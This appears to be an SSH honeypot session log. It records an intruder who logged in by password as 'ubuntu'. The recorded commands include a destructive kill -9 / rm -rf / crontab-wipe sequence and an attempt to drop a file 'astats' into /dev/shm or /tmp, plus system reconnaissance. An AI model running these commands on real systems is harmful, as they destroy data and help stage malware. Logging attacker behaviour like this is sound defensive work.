+session_start | mode=non_interactive_exec | session_id=1776767638_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:58.000010 UTC] [1776767638_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=readlink -f /proc/gcs/exe
+
+[2026-04-21 10:33:58.000020 UTC] [1776767638_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:58.000100 UTC] [1776767638_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 1: readlink: command not found
+
+[2026-04-21 10:33:58.000200 UTC] [1776767638_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:58.000400 UTC] [1776767635_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 1: kill: gcs: arguments must be process or job IDs
+
+[2026-04-21 10:33:58.000500 UTC] [1776767635_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:58.053058 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:58.113559 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:58.167672 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_1 | rc=1
+
+[2026-04-21 10:33:58.609732 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:58.661622 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:58.687348 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:34:00.000000 UTC] [1776767638_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-21 10:34:00.000400 UTC] [1776767638_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 1: readlink: command not found
+
+[2026-04-21 10:34:00.000500 UTC] [1776767638_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:34:00.112799 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:34:00.298331 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:34:00.325827 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:34:00.350869 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:34:00.550042 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:34:00.550215 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:34:00.550306 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:34:00.586734 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:34:00.605462 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=127
+
+[2026-04-21 10:34:00.876944 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:34:00.934976 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:34:01.000000 UTC] [1776767641_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767641_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:34:01.000010 UTC] [1776767641_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+        kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u);
+        rm -rf .;
+        crontab -l 2>/dev/null | grep -v . | crontab -
+
+[2026-04-21 10:34:01.000020 UTC] [1776767641_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:34:01.000100 UTC] [1776767641_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 2: sort: command not found
+kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+/bin/rm: refusing to remove '.' or '..' directory: skipping '.'
+/bin/bash: line 4: grep: command not found
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-21 10:34:01.000200 UTC] [1776767641_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:34:01.009375 UTC] [1776767638_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_127 | rc=127
+
+[2026-04-21 10:34:01.428762 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:34:01.532402 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:34:01.569262 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:34:04.000000 UTC] [1776767641_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-21 10:34:04.000400 UTC] [1776767641_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 2: sort: command not found
+kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+/bin/rm: refusing to remove '.' or '..' directory: skipping '.'
+/bin/bash: line 4: grep: command not found
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-21 10:34:04.000500 UTC] [1776767641_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:34:04.037364 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:34:04.175745 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:34:04.202795 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:34:04.230383 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:34:04.452179 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:34:04.452322 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:34:04.452416 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:34:04.494403 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:34:04.564129 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=127
+
+[2026-04-21 10:34:04.873865 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:34:04.933701 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:34:04.989110 UTC] [1776767641_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_127 | rc=127
+
+[2026-04-21 10:34:05.000000 UTC] [1776767645_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776767645_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:34:05.000010 UTC] [1776767645_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=kill -9 gcs
+
+[2026-04-21 10:34:05.000020 UTC] [1776767645_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:34:05.000400 UTC] [1776767645_149.210.235.123_60696_sshshadow] [prepare.stderr]
+prepare.stderr
+rsync: [receiver] write failed on "/shadow/sessions/1776767645_149.210.235.123_60696_sshshadow/rootfs/var/log/mavproxy/sessions/1774217910_172.18.0.2_45001_mavproxy/events.jsonl": No space left on device (28)
+rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7]
+rsync: [sender] write error: Broken pipe (32)
+
+[2026-04-21 10:34:05.266259 UTC] [1776767645_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:34:05.332989 UTC] [1776767645_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:34:05.359246 UTC] [1776767645_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:34:10.000000 UTC] [1776767650_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776767650_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:34:10.000010 UTC] [1776767650_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-21 10:34:10.000020 UTC] [1776767650_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:34:10.444716 UTC] [1776767650_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:34:10.498380 UTC] [1776767645_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=fail | message=rsync: [receiver] write failed on "/shadow/sessions/1776767645_149.210.235.123_60696_sshshadow/rootfs/var/log/mavproxy/sessions/1774217910_172.18.0.2_45001_mavproxy/events.jsonl": No space left on device (28) rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7] rsync: [sender] write error: Broken pipe (32)  | rc=11
+
+[2026-04-21 10:34:10.519244 UTC] [1776767650_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=fail | message=console busy | rc=1
+
+[2026-04-21 10:34:10.894548 UTC] [1776767650_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:34:10.948270 UTC] [1776767650_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:34:10.973103 UTC] [1776767650_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:34:11.154083 UTC] [1776767650_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=fail | rc=120
+
+[2026-04-21 10:34:11.222350 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:48702 | raw=Connection from 149.210.235.123 port 48702 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-21 10:34:11.318975 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:48708 | raw=Connection from 149.210.235.123 port 48708 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-21 10:34:11.817455 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:48702 | user=ubuntu | method=password | raw=Accepted password for ubuntu from 149.210.235.123 port 48702 ssh2
+
+[2026-04-21 10:36:34.000000 UTC] [1776767794_149.210.235.123_37116_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776767794_149.210.235.123_37116_sshshadow
+
+[2026-04-21 10:36:34.000010 UTC] [1776767794_149.210.235.123_37116_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-21 10:36:34.000020 UTC] [1776767794_149.210.235.123_37116_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:36:34.000400 UTC] [1776767794_149.210.235.123_37116_sshshadow] [prepare.stderr]
+prepare.stderr
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/__phello__/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/asyncio/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/collections/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/concurrent/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/concurrent/futures" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/ctypes/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/curses/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/dbm/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/distutils/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [receiver] write failed on "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/lib/x86_64-linux-gnu/libc.so.6": No space left on device (28)
+rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7]
+rsync: [sender] write error: Broken pipe (32)
+
+[2026-04-21 10:36:34.545607 UTC] [1776767794_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:36:34.611959 UTC] [1776767794_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:36:34.643230 UTC] [1776767794_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:36:34.889450 UTC] [1776767794_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=fail | message=rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/asyncio/__pycache__" failed: No space left on device (28) *** Skipping any contents from this failed directory *** rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/collections/__pycache__" failed: No space left on device (28) *** Skipping any contents from this failed directory *** rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767794_149.210.235.123_37116_sshshadow/rootfs/u | rc=11
+
+[2026-04-21 10:36:35.000000 UTC] [1776767795_149.210.235.123_37116_sshshadow] [session_end]
+session_end | reason=exit_code_125
+
+[2026-04-21 10:36:35.000000 UTC] [1776767795_149.210.235.123_37116_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776767795_149.210.235.123_37116_sshshadow
+
+[2026-04-21 10:36:35.000010 UTC] [1776767795_149.210.235.123_37116_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-21 10:36:35.000020 UTC] [1776767795_149.210.235.123_37116_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:36:35.000400 UTC] [1776767795_149.210.235.123_37116_sshshadow] [prepare.stderr]
+prepare.stderr
+rsync: [receiver] write failed on "/shadow/sessions/1776767795_149.210.235.123_37116_sshshadow/rootfs/bin/bash": No space left on device (28)
+rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7]
+rsync: [sender] write error: Broken pipe (32)
+
+[2026-04-21 10:36:35.000500 UTC] [1776767795_149.210.235.123_37116_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    ".prepared",
+    "usr/lib/python3.11/sitecustomize.py"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 2,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:36:35.266323 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:36:35.322210 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:36:35.347955 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:36:35.562353 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=fail | message=rsync: [receiver] write failed on "/shadow/sessions/1776767795_149.210.235.123_37116_sshshadow/rootfs/bin/bash": No space left on device (28) rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7] rsync: [sender] write error: Broken pipe (32)  | rc=11
+
+[2026-04-21 10:36:35.630980 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:36:35.690890 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:36:35.745473 UTC] [1776767795_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_125 | rc=125
+
+[2026-04-21 10:36:36.000000 UTC] [1776767796_149.210.235.123_37116_sshshadow] [session_end]
+session_end | reason=exit_code_125
+
+[2026-04-21 10:36:36.000000 UTC] [1776767796_149.210.235.123_37116_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776767796_149.210.235.123_37116_sshshadow
+
+[2026-04-21 10:36:36.000010 UTC] [1776767796_149.210.235.123_37116_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-21 10:36:36.000020 UTC] [1776767796_149.210.235.123_37116_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:36:36.000400 UTC] [1776767796_149.210.235.123_37116_sshshadow] [prepare.stderr]
+prepare.stderr
+rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767796_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/distutils/__pycache__" failed: No space left on device (28)
+*** Skipping any contents from this failed directory ***
+rsync: [receiver] write failed on "/shadow/sessions/1776767796_149.210.235.123_37116_sshshadow/rootfs/bin/bash": No space left on device (28)
+rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7]
+rsync: [sender] write error: Broken pipe (32)
+
+[2026-04-21 10:36:36.000500 UTC] [1776767796_149.210.235.123_37116_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    ".prepared",
+    "usr/lib/python3.11/sitecustomize.py"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 2,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:36:36.156002 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:36:36.211712 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:36:36.237037 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:36:36.450979 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=fail | message=rsync: [generator] recv_generator: mkdir "/shadow/sessions/1776767796_149.210.235.123_37116_sshshadow/rootfs/usr/lib/python3.11/distutils/__pycache__" failed: No space left on device (28) *** Skipping any contents from this failed directory *** rsync: [receiver] write failed on "/shadow/sessions/1776767796_149.210.235.123_37116_sshshadow/rootfs/bin/bash": No space left on device (28) rsync error: error in file IO (code 11) at receiver.c(381) [receiver=3.2.7] rsync: [sender] write error: Broken pipe (32)  | rc=11
+
+[2026-04-21 10:36:36.519086 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:36:36.579232 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:36:36.630980 UTC] [1776767796_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_125 | rc=125
+
+[2026-04-21 10:36:37.038840 UTC] [1776767797_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:36:37.107963 UTC] [1776767797_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:36:37.134572 UTC] [1776767797_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:36:37.413096 UTC] [1776767797_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=fail | rc=120
+
+[2026-04-21 10:36:37.808375 UTC] [1776767797_149.210.235.123_37116_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
